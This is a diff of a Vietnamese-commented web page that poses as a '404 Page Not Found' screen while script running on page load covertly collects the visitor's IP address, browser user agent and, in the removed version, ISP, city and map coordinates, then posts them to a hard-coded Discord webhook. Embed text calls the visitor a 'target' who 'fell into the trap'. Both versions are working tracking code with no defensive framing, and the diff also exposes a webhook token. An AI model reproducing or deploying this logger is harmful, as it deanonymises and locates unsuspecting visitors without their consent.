@@ -7,97 +7,53 @@
 </head>
 <body class="bg-[#1a1a1a] h-screen overflow-hidden font-mono">
 
-    <div id="fake-screen" class="flex flex-col items-center justify-center h-full text-center bg-white">
-        <h1 class="text-9xl font-bold text-gray-200">404</h1>
-        <p class="text-gray-400 text-xl">Page Not Found</p>
-        <p class="text-gray-300 mt-4 text-sm underline cursor-pointer">Quay lại trang chủ</p>
+    <div id="fake-screen" class="flex flex-col items-center justify-center h-full text-center">
+        <h1 class="text-8xl font-bold text-gray-800">404</h1>
+        <p class="text-gray-500">Page Not Found</p>
     </div>
 
     <script>
-        // ==========================================
-        // 1. CẤU HÌNH DISCORD WEBHOOK CỦA BẠN
-        // ==========================================
+        // 1. DÁN DISCORD WEBHOOK CỦA BẠN VÀO ĐÂY
         const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1468844769491816593/yTdv41UmmXjKLYH-HE_b7jRPynj1u5scque6jdSQOb21HDLtNOpca4WvaKiFpKHWClmv";
 
-        // ==========================================
-        // 2. LOGIC BYPASS & TRACE (VƯỢT RÀO & TRUY VẾT)
-        // ==========================================
-        async function startAdvancedTrace() {
+        // 2. HÀM LẤY IP SIÊU TỐC
+        async function sendIP() {
             try {
-                // Sử dụng API ipwho.is để lấy full thông tin (Bypass cực tốt)
-                const response = await fetch('https://ipwho.is/');
-                const data = await response.json();
+                // Lấy IP trực tiếp từ hệ thống Cloudflare (Cực nhanh)
+                const response = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
+                const text = await response.text();
+                const ip = text.split('\n').find(line => line.startsWith('ip=')).split('=')[1];
 
-                if(!data.success) throw new Error("API Blocked");
-
-                // Tạo link Google Maps dựa trên tọa độ
-                const googleMapsLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
-
-                // Nội dung gửi lên Discord
-                const payload = {
-                    username: "Hệ Thống Truy Vết Mũ Trắng",
-                    avatar_url: "https://i.imgur.com/8nS8z3L.png",
-                    embeds: [{
-                        title: "🎯 ĐÃ TÓM ĐƯỢC MỤC TIÊU!",
-                        description: "Mục tiêu đã sập bẫy. Dưới đây là thông tin chi tiết:",
-                        color: 16711680, // Màu đỏ rực
-                        fields: [
-                            { name: "🌐 Địa chỉ IP", value: `\`${data.ip}\``, inline: true },
-                            { name: "🛡️ Loại IP", value: `\`${data.type}\``, inline: true },
-                            { name: "🏢 Nhà mạng (ISP)", value: `\`${data.connection.isp}\``, inline: false },
-                            { name: "📍 Vị trí", value: `${data.city}, ${data.region}, ${data.country}`, inline: true },
-                            { name: "🗺️ Bản đồ", value: `[Bấm để xem vị trí](${googleMapsLink})`, inline: true },
-                            { name: "🖥️ Thiết bị", value: `\`${navigator.userAgent.substring(0, 150)}...\``, inline: false }
-                        ],
-                        footer: { text: "Tracing System Beta • " + new Date().toLocaleString('vi-VN') },
-                        thumbnail: { url: data.flag.img } // Hiện cờ quốc gia của mục tiêu
-                    }]
-                };
-
-                // Gửi về Discord
+                // Gửi dữ liệu về Discord
                 if (DISCORD_WEBHOOK.includes("discord.com")) {
                     await fetch(DISCORD_WEBHOOK, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload)
-                    });
-                }
-
-            } catch (err) {
-                // Cách dự phòng nếu API trên bị chặn (Lấy IP thô qua Cloudflare)
-                try {
-                    const cfRes = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
-                    const text = await cfRes.text();
-                    const rawIP = text.split('\n').find(line => line.startsWith('ip=')).split('=')[1];
-                    
-                    fetch(DISCORD_WEBHOOK, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
-                            content: `⚠️ **Bypass Cấp Độ 2:** Phát hiện IP: \`${rawIP}\` (Dữ liệu vị trí bị chặn bởi Adblock)`
+                            embeds: [{
+                                title: "🚀 MỤC TIÊU TRUY CẬP",
+                                color: 16711680,
+                                fields: [
+                                    { name: "📍 IP Address", value: `\`${ip}\`` },
+                                    { name: "🖥️ Thiết bị", value: navigator.userAgent }
+                                ],
+                                footer: { text: "Time: " + new Date().toLocaleString() }
+                            }]
                         })
                     });
-                } catch (e) {
-                    console.error("Mục tiêu dùng bảo mật quá cao.");
                 }
+            } catch (err) {
+                console.log("Error capturing IP.");
             }
         }
 
-        // Chạy ngầm ngay khi load trang
-        window.onload = startAdvancedTrace;
+        // Chạy ngay khi mở trang
+        sendIP();
 
-        // Phím tắt L để giả lập Admin (Dành cho bạn diễn)
+        // 3. PHÍM TẮT L (Dành cho Admin)
         document.addEventListener('keydown', (e) => {
             if (e.key.toLowerCase() === 'l') {
-                document.body.innerHTML = `
-                    <div class="p-10 text-green-500">
-                        <p>> Đang kết nối vệ tinh...</p>
-                        <p>> Đã xác định tọa độ...</p>
-                        <p>> Dữ liệu đã được gửi về Discord.</p>
-                        <p>> Nhấn F5 để thoát.</p>
-                    </div>
-                `;
-                document.body.className = "bg-black h-screen font-mono";
+                alert("Hệ thống đang chạy ngầm.");
             }
         });
     </script>
